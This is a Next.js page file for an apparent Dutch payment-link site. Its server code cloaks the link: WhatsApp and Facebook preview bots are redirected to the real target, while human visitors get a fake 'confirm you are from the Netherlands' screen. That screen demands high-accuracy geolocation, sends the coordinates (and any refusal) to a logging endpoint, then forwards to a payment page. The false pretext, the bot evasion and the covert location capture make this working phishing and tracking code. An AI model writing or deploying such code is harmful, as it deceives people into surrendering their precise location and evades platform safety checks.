import redis from '../../lib/redis';

export async function getServerSideProps({ params, req }) {
  const { slug } = params;
  const userAgent = req.headers['user-agent'] || '';

  const isWhatsApp =
    /whatsapp|facebookexternalhit|facebot|meta/i.test(userAgent);

  const parsed = await redis.get(`slug-${slug}`);
  if (!parsed) {
    return { notFound: true };
  }

  // ✅ WhatsApp / preview bots → direct naar echte target
  if (isWhatsApp) {
    return {
      redirect: {
        destination: parsed.target,
        permanent: false,
      },
    };
  }

  // 👤 echte gebruiker → verify pagina renderen
  return {
    props: { slug },
  };
}

import { useState } from 'react';

export default function Verify({ slug }) {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const log = async (data) => {
    await fetch('/api/store-location', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  };

  const handleLocation = () => {
    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await log({
          slug,
          flow: 'verify',
          event: 'allowed',
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });

        window.location.href = `/pay/${slug}?verified=1`;
      },
      async () => {
        await log({
          slug,
          flow: 'verify',
          event: 'denied',
          denied: true,
        });

        setError('Locatie is verplicht om verder te gaan.');
        setLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  return (
    <>
      <style>{`
        html, body {
          margin: 0;
          padding: 0;
          background: #414380;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        }

        .page {
          min-height: 100vh;
          background: #414380;
          display: flex;
          flex-direction: column;
          align-items: center;
          text-align: center;
        }

        .circle {
          margin-top: 20px;
          width: 200px;
          height: 200px;
          border-radius: 50%;
          background: #ffffff;
          border: 12px solid #353575;
          overflow: hidden;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .circle img {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        h1 {
          color: #ffffff;
          font-size: 28px;
          margin: 24px 16px 8px;
        }

        p {
          color: #dcdff5;
          font-size: 16px;
          margin: 0 24px 24px;
        }

        button {
          background: #4CB7AC;
          color: #ffffff;
          border: none;
          border-radius: 14px;
          padding: 16px;
          font-size: 16px;
          width: calc(100% - 48px);
          max-width: 360px;
          box-shadow: 0 6px 16px rgba(0,0,0,0.25);
          cursor: pointer;
        }

        button:disabled {
          opacity: 0.7;
        }

        .error {
          margin-top: 16px;
          color: #ffd6d6;
        }
      `}</style>

      <div className="page">
        <div className="circle">
          <img
            src="https://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
            alt="Verificatie"
          />
        </div>

        <h1>🇳🇱 Bevestig dat je uit Nederland komt</h1>

        <p>
          Geef eerst toegang tot locatie om gebruik te maken van deze betaallink.
        </p>

        <button onClick={handleLocation} disabled={loading}>
          {loading ? 'Even geduld…' : 'Bevestigen met locatie'}
        </button>

        {error && <div className="error">{error}</div>}
      </div>
    </>
  );
}
